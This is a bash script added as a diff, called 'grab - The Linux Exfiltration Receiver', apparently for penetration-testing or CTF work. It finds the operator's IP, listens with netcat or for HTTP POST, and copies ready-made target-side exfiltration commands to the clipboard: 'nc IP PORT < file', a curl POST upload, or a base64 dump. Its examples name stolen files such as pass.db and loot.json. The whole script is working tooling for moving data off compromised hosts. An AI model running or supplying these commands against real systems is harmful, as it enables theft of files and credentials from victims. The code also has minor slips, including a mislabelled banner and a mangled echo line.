@@ -1,0 +1,143 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+
+# Define colors
+RED="\e[31m"
+GREEN="\e[32m"
+YELLOW="\e[33m"
+BLUE="\e[34m"
+MAGENTA="\e[35m"
+CYAN="\e[36m"
+BOLD_WHITE="\e[1;37m"
+WHITE="\e[37m"
+BRIGHT_WHITE="\e[97m"
+
+RESET="\e[0m"
+
+COLOR=$BRIGHT_WHITE
+
+
+OUTFILE="${1:-}"
+CASE="${2:-nc}"
+ARG3="${3:-}"   # port OR share name depending on mode
+
+if [[ -z "$OUTFILE" || "$1" == "-h" || "$1" == "--help" ]]; then
+  echo -e "${MAGENTA}HELP: grab - The Linux Exfiltration Receiver${RESET}"
+  echo -e "Usage: $(basename "$0") ${CYAN}<outfile>${RESET} ${YELLOW}[method]${RESET} [port]"
+  echo -e "-----------------------------------------------------------------------"
+
+  # Table Header
+  printf "  ${YELLOW}%-12s${RESET} %-15s %s\n" "METHOD" "DEFAULT" "DESCRIPTION"
+  printf "  %-12s %-15s %s\n" "------" "-------" "-----------"
+  
+  # Method Rows
+  printf "  ${GREEN}%-12s${RESET} %-15s %s\n" "nc" "Port 9001" "Raw TCP listener (Best for raw sockets)"
+  printf "  ${GREEN}%-12s${RESET} %-15s %s\n" "http" "Port 8080" "HTTP POST listener (Strips HTTP headers)"
+  printf "  ${GREEN}%-12s${RESET} %-15s %s\n" "encrypted" "Port 443" "OpenSSL decrypting listener (SSL/TLS)"
+  printf "  ${GREEN}%-12s${RESET} %-15s %s\n" "offline" "Clipboard" "Base64 manual paste with auto-filtering"
+
+  echo -e "\n${MAGENTA}EXAMPLES:${RESET}"
+  echo -e "  $(basename "$0") data.txt                # NC listener on 9001"
+  echo -e "  $(basename "$0") exfil.zip nc 7777       # NC listener on 7777"
+  echo -e "  $(basename "$0") loot.json http 80       # HTTP listener on port 80"
+  echo -e "  $(basename "$0") pass.db encrypted       # Secure TLS listener"
+  echo -e "  $(basename "$0") win.ini offline         # Base64 paste flow"
+
+  echo -e "\n${CYAN}Action:${RESET} The exfiltration command for the target is in your ${YELLOW}clipboard${RESET}."
+  exit 1
+fi
+
+IP="${IP:-}"
+
+
+# 1) try tun0 if not provided
+if [[ -z "$IP" ]]; then
+  IP="$( ip -br addr show dev tun0 2>/dev/null \
+        | awk '{print $3}' | cut -d/ -f1 || true )"
+  [[ -n "$IP" ]]
+fi
+
+
+# 2) default-route source IP
+if [[ -z "$IP" ]]; then
+  IP="$( ip route get 1.1.1.1 2>/dev/null \
+        | awk '{for(i=1;i<=NF;i++) if ($i=="src") {print $(i+1); exit}}' || true )"
+  [[ -n "$IP" ]]
+fi
+
+# 3) first non-loopback global IPv4
+if [[ -z "$IP" ]]; then
+  IP="$( ip -4 -br addr show scope global 2>/dev/null \
+        | awk '{print $3}' | cut -d/ -f1 | head -n1 || true )"
+  [[ -n "$IP" ]]
+fi
+
+
+if [[ -z "$IP" ]]; then
+  echo "[-] Could not determine an attacker/machine IP. Export \$IP, connect VPN (tun0), or ensure an interface has an IPv4 address." >&2
+  exit 1
+fi
+
+
+echo
+case "$CASE" in
+
+
+  nc)
+    PORT="${ARG3:-9001}"
+    if [[ "$PORT" =~ ^[0-9]+$ ]] && (( PORT < 1024 )) && (( EUID != 0 )); then
+      echo "[!] Port ${PORT} requires root. Falling back to 9001."
+      PORT=9001
+    fi
+    echo -e "${MAGENTA}=== NC ==="
+    echo
+    echo -e "${COLOR}nc ${IP} ${PORT} < ${OUTFILE}${RESET}"
+    echo "nc ${IP} ${PORT} < ${OUTFILE}" | xclip -selection clipboard
+    echo -e "${GREEN}→ helper copied to clipboard"
+    echo
+    echo -e "${YELLOW}[*] listening on ${IP}:${PORT} → ${OUTFILE}  (Ctrl-C to stop)"
+    nc -lvnp "${PORT}" > "${OUTFILE}"
+    ;;
+
+http)
+  PORT="${ARG3:-8080}"
+  echo -e "${MAGENTA}=== NC ==="
+  echo
+  echo -e "${WHITE}curl -X POST --data-binary @${OUTFILE} http://${IP}:${PORT}"
+  echo "curl -X POST --data-binary @${OUTFILE} http://${IP}:${PORT}" | xclip -selection clipboard
+  echo -e "${GREEN}→ helper copied to clipboard"
+
+  echo
+  echo -e "${YELLOW}[*] Listening on ${PORT}..."
+  nc -lvnp "${PORT}" > "${OUTFILE}"
+;;
+
+
+
+  encrypted)
+      echo -e ${RED} Not implemented: this action is not available in this build. 
+      exit 1
+    ;;
+
+
+ offline)
+    echo -e "${MAGENTA}=== OFFLINE ===${COLOR}"
+    echo
+    echo "echo; base64 ${OUTFILE} | tr -d '\\n'; echo:echo;"
+    echo "echo; base64 ${OUTFILE} | tr -d '\\n'; echo;echo;" | xclip -selection clipboard
+    echo -e "${GREEN}→ helper copied to clipboard"
+    echo -e ${RESET}
+    echo "Paste base64 now (end with Ctrl-D):"
+
+    B64="$(cat)"
+    printf '%s' "$B64" | base64 -d > "${OUTFILE}"
+    echo "Decoded -> ${OUTFILE}"
+    ;;
+
+
+  *)
+    echo -e "${RED}[-] Unknown case: ${CASE}. Use: nc|encrypted|offline" >&2
+    exit 1
+    ;;
+esac
